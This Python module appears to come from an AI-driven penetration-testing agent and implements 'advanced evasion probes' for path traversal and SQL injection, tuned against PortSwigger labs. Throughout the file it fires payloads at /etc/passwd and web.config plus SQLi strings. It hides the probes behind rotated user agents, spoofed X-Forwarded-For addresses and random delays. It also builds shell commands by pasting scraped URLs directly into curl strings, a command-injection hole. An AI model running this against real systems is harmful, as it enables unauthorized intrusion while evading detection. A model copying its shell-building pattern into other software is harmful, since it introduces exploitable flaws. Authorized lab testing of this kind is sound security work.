import logging
import random
import re
import time
from urllib.parse import parse_qsl, urlsplit, urlunsplit

from app.tools.utils import normalize_domain_for_memory, find_sensitive_content_match
from app.tools.payloads import fetch_intruder_payloads
from app.tools.vuln_report_writer import VulnerabilityReportWriter

logger = logging.getLogger(__name__)

# Live-discovered 2026-07-25: a real run against a PortSwigger lab called
# Advanced_Evasion_Probe with tool_input
# "https://<lab>.web-security-academy.net/ path traversal" - the model
# appended descriptive free text after the URL (a real, observed behavior,
# not a contrived edge case - Exploit_Suggester's own prior output primes
# the model toward this style). Left un-sanitized, `advanced_vuln_probe`
# spliced this whole string straight into a curl command, producing a
# broken URL (an embedded literal space, then garbage appended after it)
# that was guaranteed to fail against ANY target regardless of whether it
# was actually vulnerable. Extract just the first http(s):// token -
# trailing descriptive text is dropped rather than corrupting the request.
_URL_TOKEN_RE = re.compile(r"https?://\S+", re.IGNORECASE)


def _extract_clean_url(raw: str) -> str:
    """Pull a bare URL out of a tool_input string that may carry trailing
    free text appended by the model (see `_URL_TOKEN_RE`'s comment above).

    Args:
        raw (str): The raw `url` argument as received by
            `advanced_vuln_probe`/`stealth_run` callers.

    Returns:
        str: The first `http(s)://`-prefixed, whitespace-free token found
        in `raw`, or `raw.strip()` unchanged if no such token is present
        (e.g. a bare domain with no scheme - left as-is, not this
        function's concern).
    """
    match = _URL_TOKEN_RE.search(raw or "")
    return match.group(0) if match else (raw or "").strip()


class EvasionService:
    """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""

    def __init__(self, runner, memory, browser_manager=None):
        """Set up the probe with its command runner, memory sink, and a
        pool of user-agent strings to rotate through for stealth headers.

        Args:
            runner: Object with a `run(command, timeout=None)` method
                (shared CommandRunner).
            memory: ArgusMemory-like object with an `add_finding(...)`
                method, used to record confirmed findings.
            browser_manager (BrowserManager, optional): specs/029 - when
                supplied, a confirmed path-traversal hit gets an automatic
                screenshot captured as proof-of-concept evidence. `None`
                (the default) leaves every pre-existing behavior, call
                signature, and test in `tests/test_tools/test_evasion.py`
                unchanged - screenshot capture is strictly additive.
        """
        self.runner = runner
        self.memory = memory
        self.browser_manager = browser_manager
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]

    def _get_stealth_headers(self):
        """Build curl `-H` flags with a random User-Agent and a spoofed
        X-Forwarded-For IP, to vary the fingerprint of each probe.

        Returns:
            str: A string of `-H '...'` flags ready to splice into a curl
            command.
        """
        ua = random.choice(self.user_agents)
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return f"-H 'User-Agent: {ua}' -H 'X-Forwarded-For: {ip}'"

    def stealth_run(self, command, delay=True, timeout=20):
        """Executes a command (typically curl) with stealth headers and optional delay.

        `timeout` defaults to 20s (not command_runner's generic 180s) because
        every caller here is a single curl probe, not a full tool scan - six
        of these run sequentially in advanced_vuln_probe(), so a generous
        per-call timeout can stack up to consume the whole exploit-node
        budget (scripts/run_agent.py's AGENT_TIMEOUT_SECONDS) on its own.

        Args:
            command (str): The command to run - stealth headers are only
                added when it contains "curl ".
            delay (bool): If True, sleep a random 1-3s before running, to
                avoid a suspiciously regular request cadence.
            timeout (int): Seconds to allow the command to run.

        Returns:
            str: The underlying runner's output for `command`.
        """
        if delay:
            time.sleep(random.uniform(1, 3))

        if "curl " in command:
            headers = self._get_stealth_headers()
            command = command.replace("curl ", f"curl {headers} ")

        return self.runner.run(command, timeout=timeout)

    def _discover_candidate_paths(self, base_url):
        """Lightweight, single-page link discovery to find candidate
        endpoints when a bare-root probe finds nothing (see the specs/030
        comment in `advanced_vuln_probe` for the live-run failure this
        addresses). Reuses `CrawlerService`'s own curl+grep technique
        rather than importing it, to avoid a circular import and keep this
        self-contained - `Advanced_Evasion_Probe` must keep working even
        if `Crawl_Target` was never called first.

        Args:
            base_url (str): The root URL to fetch and scan for internal
                links.

        Returns:
            list[str]: Up to 3 same-host candidate URLs - links that
            already carry a query string ranked first (the strongest
            signal a parameter-driven endpoint exists), plain internal
            paths otherwise. Empty list if the fetch fails or nothing
            usable is found.
        """
        # 2026-08-01: matching only href="..." missed the exact case this
        # was built for - PortSwigger's own "File path traversal, simple
        # case" lab loads its vulnerable endpoint as
        # <img src="/image?filename=61.jpg">, an src= attribute on an
        # <img> tag, not an href= link. Also match src="..." so an image-
        # driven parameter (the single most common real-world path-
        # traversal pattern) isn't silently skipped.
        cmd = (
            f"curl -s -L --max-time 10 --connect-timeout 5 '{base_url}' | "
            f"grep -oE '(href|src)=\"[^\"]+\"' | cut -d'\"' -f2 | sort -u"
        )
        body = self.stealth_run(cmd, delay=False, timeout=12)
        links = [
            l for l in (body or "").split("\n")
            if l.strip() and not l.startswith(("#", "javascript:", "mailto:"))
        ]
        parsed_base = urlsplit(base_url)
        same_host = []
        for link in links:
            if link.startswith("/"):
                same_host.append(urlunsplit((parsed_base.scheme, parsed_base.netloc, link, "", "")))
            else:
                link_parsed = urlsplit(link)
                if link_parsed.netloc == parsed_base.netloc and link_parsed.scheme in ("http", "https"):
                    same_host.append(link)
        with_query = [l for l in same_host if "?" in l]
        without_query = [l for l in same_host if l not in with_query]
        seen = set()
        deduped = []
        for l in with_query + without_query:
            if l not in seen:
                seen.add(l)
                deduped.append(l)
        return deduped[:3]

    def _probe_traversal_target(self, base_url, param_candidates, traversal_payloads, clean_target, confirmed_param):
        """Run every traversal payload against one candidate base URL.

        Factored out of `advanced_vuln_probe` (specs/030) so both the
        primary probe (against the URL the caller passed in) and the
        discovery fallback (against endpoints found via
        `_discover_candidate_paths`, when the primary probe against a bare
        root found nothing) share identical hit-detection, memory-write,
        and screenshot-capture logic instead of two copies drifting apart.

        Args:
            base_url (str): Clean base URL (no query string) to probe.
            param_candidates (list[str]): Parameter names to try, in
                order, when `confirmed_param` is not yet locked.
            traversal_payloads (list[str]): Payloads to try, in order.
            clean_target (str): Normalized domain for
                `memory.add_finding()`.
            confirmed_param (str or None): Already-locked parameter name
                from a prior call, if any - carried across candidate
                targets so a param confirmed on one target is reused, not
                re-fuzzed, on the next.

        Returns:
            tuple[list[str], list[dict], str or None]: `(result lines,
            screenshot evidence dicts, the possibly-newly-locked
            confirmed_param)`.
        """
        results = []
        screenshot_evidence = []
        for p in traversal_payloads:
            for param_name in ([confirmed_param] if confirmed_param else param_candidates):
                probe_url = f"{base_url}?{param_name}={p}"
                cmd = f"curl -s --max-time 15 --connect-timeout 5 '{probe_url}'"
                body = self.stealth_run(cmd)
                summary = find_sensitive_content_match(body)
                if summary:
                    confirmed_param = param_name
                    results.append(f"[!] Path Traversal Success ({p}): {summary}")
                    self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
                    # specs/029: capture proof-of-concept evidence for this
                    # confirmed hit. Best-effort only - a screenshot failure
                    # (browser crash, Playwright not installed, etc.) must
                    # never take down an already-confirmed, already-recorded
                    # finding, so any exception here is caught and logged,
                    # never re-raised.
                    if self.browser_manager is not None:
                        try:
                            evidence = self.browser_manager.capture_vulnerability(
                                "path_traversal", probe_url, payload=p, note=summary,
                            )
                            screenshot_evidence.append(evidence)
                            # specs/029: one capture now writes a website
                            # shot plus an evidence card, so list every file
                            # rather than only the primary one. `.get` keeps
                            # this working with a BrowserManager double that
                            # returns the older single-screenshot dict.
                            for shot in evidence.get("screenshots") or [evidence["screenshot_path"]]:
                                results.append(f"    [camera] Screenshot saved: {shot}")
                        except Exception as e:
                            print(f"[!] [Argus-Core] Screenshot capture failed for payload '{p}': {e}")
                            logger.warning("Screenshot capture failed for payload %s: %s", p, e)
                            results.append(f"    [!] Screenshot capture FAILED ({p}): {e}")
                    break
        return results, screenshot_evidence, confirmed_param

    def _probe_sqli_target(self, base_url, param_candidates, sqli_payloads, sqli_error_signatures, clean_target, confirmed_param):
        """Run every SQLi payload against one candidate base URL.

        Mirrors `_probe_traversal_target`'s parameter-fuzzing and
        confirmed-param locking (2026-08-23 live-run finding). Two real,
        confirmed gaps in the previous SQLi probe are fixed by sharing
        this pattern:

        1. It always hardcoded `?id={payload}` - real PortSwigger SQLi
           labs almost never use `id` as the vulnerable parameter (e.g.
           `?category=`, `?TrackingId=`, `?search=`). A live run against
           "SQL injection vulnerability in WHERE clause allowing retrieval
           of hidden data" (run 1099dc95, 2026-08-23) probed only `?id=`,
           found nothing, and the agent then burned its whole budget
           looping on Recon_Suite/Advanced_Evasion_Probe retries instead
           of ever trying the lab's actual `?category=` parameter.
        2. If the caller's URL already carried its own query string (e.g.
           a crawled "?category=Gifts"), appending `?id=...` produced an
           invalid double-`?` URL that could never succeed regardless of
           whether the target was vulnerable.

        It also adds proof-of-concept screenshot capture on a confirmed
        hit, matching what `_probe_traversal_target` already does -
        previously a confirmed SQLi never produced a screenshot at all,
        even when the text finding was recorded correctly.

        Args:
            base_url (str): Clean base URL (no query string) to probe.
            param_candidates (list[str]): Parameter names to try, in
                order, when `confirmed_param` is not yet locked.
            sqli_payloads (list[str]): Payloads to try, in order.
            sqli_error_signatures (tuple[str, ...]): Lowercase substrings
                that, if found in a response body, indicate a real DB
                error page.
            clean_target (str): Normalized domain for
                `memory.add_finding()`.
            confirmed_param (str or None): Already-locked parameter name
                from a prior call, if any.

        Returns:
            tuple[list[str], list[dict], str or None]: `(result lines,
            screenshot evidence dicts, the possibly-newly-locked
            confirmed_param)`.
        """
        results = []
        screenshot_evidence = []
        for p in sqli_payloads:
            for param_name in ([confirmed_param] if confirmed_param else param_candidates):
                probe_url = f"{base_url}?{param_name}={p}"
                cmd = f"curl -s --max-time 15 --connect-timeout 5 -w '\\n%{{http_code}}' '{probe_url}'"
                res = self.stealth_run(cmd)
                body, _, code = res.rpartition("\n")
                reason = None
                if code == "500":
                    reason = "Server Error 500"
                elif any(sig in body.lower() for sig in sqli_error_signatures):
                    reason = "SQL error signature in response body"
                if reason:
                    confirmed_param = param_name
                    results.append(f"[!] Potential SQLi (Evasion): {p} ({reason})")
                    self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"SQLi: {p}", "SQLi potential via WAF evasion")
                    # 2026-08-23: capture proof-of-concept evidence for this
                    # confirmed hit, exactly like _probe_traversal_target
                    # does. Best-effort only - never take down an
                    # already-confirmed, already-recorded finding.
                    if self.browser_manager is not None:
                        try:
                            evidence = self.browser_manager.capture_vulnerability(
                                "sql_injection", probe_url, payload=p, note="SQLi potential via WAF evasion",
                            )
                            screenshot_evidence.append(evidence)
                            for shot in evidence.get("screenshots") or [evidence["screenshot_path"]]:
                                results.append(f"    [camera] Screenshot saved: {shot}")
                        except Exception as e:
                            print(f"[!] [Argus-Core] Screenshot capture failed for payload '{p}': {e}")
                            logger.warning("Screenshot capture failed for payload %s: %s", p, e)
                            results.append(f"    [!] Screenshot capture FAILED ({p}): {e}")
                    break
        return results, screenshot_evidence, confirmed_param

    def advanced_vuln_probe(self, url):
        """Performs targeted, WAF-evasive probes for SQLi and Path Traversal.

        Verifies against real response content (`SENSITIVE_CONTENT_INDICATORS`),
        not HTTP status alone - a bare "200" or "500" proves nothing about
        *what* came back (a WAF challenge page or a normal error page can
        return either), so the original status-only check both missed real
        findings and could false-positive on an unrelated 200. Traversal
        payloads cover Linux targets (`/etc/passwd` - what most real-world
        and training-lab traversal vulnerabilities, e.g. PortSwigger's
        labs, actually test for) as well as the original Windows/IIS-style
        `web.config`, since recon doesn't always confirm the target OS
        before this runs.

        Args:
            url (str): Target URL to probe. Any trailing free text the
                model appended (e.g. "<url> path traversal") is stripped
                via `_extract_clean_url` before use. If `url` already
                carries a query string (e.g. a crawled
                "?filename=x.jpg"), that parameter's name is reused for
                every payload instead of a guessed one; otherwise a short
                list of common real-world parameter names is tried per
                payload (`item`, `file`, `filename`, `path`, `document`) -
                see the inline comment below for why `item` alone isn't
                enough.

        Returns:
            str: A formatted report of confirmed findings, or
            "No vulnerabilities detected with advanced evasion probes." if
            none of the traversal/SQLi payloads produced a signal.
        """
        url = _extract_clean_url(url)
        print(f"[*] [Argus-Core] Starting Advanced Evasion Probes for: {url}")
        results = []
        screenshot_evidence = []
        clean_target = normalize_domain_for_memory(url)

        # 1. Path Traversal Evasion
        # --max-time/--connect-timeout let curl itself enforce the bound
        # (more reliable than only relying on the outer process being
        # killed - see command_runner.py's own timeout handling).
        parsed = urlsplit(url)
        existing_params = parse_qsl(parsed.query, keep_blank_values=True)
        base_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        if existing_params:
            # A parameter name the model/recon already discovered on this
            # exact endpoint is a far stronger signal than any guess -
            # reuse it instead of the synthetic candidate list below.
            param_candidates = [existing_params[-1][0]]
        else:
            # "item" stays first for exact backward compatibility with
            # every pre-existing call site/test that passes a bare URL.
            # The rest is a live, evidence-backed addition (2026-07-25):
            # this project's own specs/025 benchmark fixture
            # (path_traversal_download) uses "?file=", not "?item=", and
            # scored 0% on its "traverse_to_secret_file"/"retrieve_flag"
            # subtasks in EVERY recorded benchmark run because of exactly
            # this mismatch - confirmed by directly testing this method
            # against the fixture's real server. A live PortSwigger run
            # the same day hit the same class of gap. Kept to 5 names:
            # each additional candidate multiplies the live requests per
            # payload, and EvasionService is already the slowest tool in a
            # run (stealth_run's per-call delay).
            param_candidates = ["item", "file", "filename", "path", "document"]
        # Locked in the first time any candidate confirms a hit - once the
        # real parameter name is known, stop re-fuzzing it for every
        # subsequent payload.
        confirmed_param = None

        traversal_payloads = [
            "../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd",
            "web.config",
            "..%2f..%2fweb.config",
            "..%5c..%5cweb.config",
        ]
        # Diversify beyond this small static list with real payloads pulled
        # from the local PayloadsAllTheThings mirror (deduplicated - a
        # random sample can coincidentally repeat one already listed above).
        traversal_payloads += [
            p for p in fetch_intruder_payloads(self.runner, "path_traversal")
            if p not in traversal_payloads
        ]
        results_here, evidence_here, confirmed_param = self._probe_traversal_target(
            base_url, param_candidates, traversal_payloads, clean_target, confirmed_param
        )
        results.extend(results_here)
        screenshot_evidence.extend(evidence_here)

        # specs/030: a bare-root probe (no existing query string, nothing
        # found above) never learns where the real vulnerable endpoint
        # actually is - PortSwigger's own path-traversal labs put it on a
        # specific page (e.g. "/image?filename=..."), not on "/" itself.
        # Observed live 2026-08-01 (runs b84499b0, 5f71e301, and others):
        # Advanced_Evasion_Probe ran multiple times against the bare root,
        # found nothing every time, and the model never called
        # Crawl_Target first - the "no vulnerabilities detected" result
        # was a false negative caused by testing the wrong path, not
        # evidence the target was actually clean. Fall back to a
        # lightweight, same-page link discovery and retry against up to 3
        # promising same-host endpoints before giving up.
        if not results and not existing_params:
            for discovered_url in self._discover_candidate_paths(base_url):
                d_parsed = urlsplit(discovered_url)
                d_existing = parse_qsl(d_parsed.query, keep_blank_values=True)
                d_base = urlunsplit((d_parsed.scheme, d_parsed.netloc, d_parsed.path, "", ""))
                d_candidates = [d_existing[-1][0]] if d_existing else param_candidates
                results_n, evidence_n, confirmed_param = self._probe_traversal_target(
                    d_base, d_candidates, traversal_payloads, clean_target, confirmed_param
                )
                results.extend(results_n)
                screenshot_evidence.extend(evidence_n)
                if results_n:
                    break

        # 2. SQLi WAF Evasion
        # A 500 alone is still checked (a real signal on its own), but now
        # also checks the body for actual SQL-error text - some targets
        # return 200 with a visible DB error instead of a 500.
        sqli_error_signatures = (
            "sql syntax", "mysql_fetch", "unclosed quotation mark",
            "odbc drivers error", "sqlite3.operationalerror", "pg_query",
        )
        sqli_payloads = ["%u0027", "1'/**/OR/**/1=1/**/--", "1%20OR%201=1"]
        sqli_payloads += [
            p for p in fetch_intruder_payloads(self.runner, "sqli")
            if p not in sqli_payloads
        ]
        # 2026-08-23: reuse the same existing-parameter-name signal the
        # traversal probe already relies on, instead of always guessing
        # "id" - see _probe_sqli_target's docstring for the live-run
        # finding this fixes. "id" stays first in the fallback list for
        # exact backward compatibility with every pre-existing call site
        # and test that passes a bare URL.
        if existing_params:
            sqli_param_candidates = [existing_params[-1][0]]
        else:
            sqli_param_candidates = ["id", "category", "search", "productId", "username"]
        results_here, evidence_here, _sqli_confirmed_param = self._probe_sqli_target(
            base_url, sqli_param_candidates, sqli_payloads, sqli_error_signatures, clean_target, None
        )
        results.extend(results_here)
        screenshot_evidence.extend(evidence_here)

        if not results:
            return "No vulnerabilities detected with advanced evasion probes."

        report_line = ""
        if screenshot_evidence:
            try:
                # Report the actual vulnerability type(s) captured rather
                # than a hardcoded "path_traversal" - a run can now confirm
                # SQLi, traversal, or both in the same probe.
                evidence_types = {
                    e.get("vulnerability_type") for e in screenshot_evidence if e.get("vulnerability_type")
                }
                report_type = next(iter(evidence_types)) if len(evidence_types) == 1 else "mixed"
                report_path = VulnerabilityReportWriter().save_report(
                    clean_target, report_type, screenshot_evidence,
                )
                report_line = f"\n[report] Vulnerability evidence report: {report_path}"
            except Exception as e:
                logger.warning("Failed to write vulnerability evidence report: %s", e)

        return "--- [SHIELD] ADVANCED EVASION PROBE REPORT ---\n" + "\n".join(results) + report_line
